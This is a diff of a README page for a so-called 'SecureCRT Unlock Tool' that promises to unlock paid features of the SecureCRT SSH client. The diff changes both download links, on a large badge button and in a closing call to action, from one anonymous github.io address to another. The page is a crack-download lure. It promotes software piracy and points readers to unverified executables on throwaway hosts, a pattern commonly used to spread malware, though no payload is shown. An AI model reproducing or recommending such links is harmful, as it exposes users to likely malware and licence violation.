@@ -6,7 +6,7 @@
 <h1 align="center">⚡ SecureCRT Unlock Tool</h1>
 
 <p align="center">
-  <a href="https://hiopal3847.github.io/.github/289" target="_blank">
+  <a href="https://securecrtload.github.io/.github/" target="_blank">
     <img src="https://img.shields.io/badge/Download%20SecureCRT%20Unlock%20Tool-Enable%20All%20Features-FF6F00?style=for-the-badge&logo=files&logoColor=white" 
          alt="Download SecureCRT Unlock Tool" style="width: 540px; height: 37px;">
   </a>
@@ -98,7 +98,7 @@ Found an issue or have suggestions? Open an issue or submit a pull request.
 ## ⭐ Unlock SecureCRT – Professional SSH and Terminal Access
 
 Enhance your remote management workflow with powerful SecureCRT features.  
-[Download the Unlock Tool](https://hiopal3847.github.io/.github/289) and access the full potential of SecureCRT.
+[Download the Unlock Tool](https://securecrtload.github.io/.github/) and access the full potential of SecureCRT.
 
 ---
 
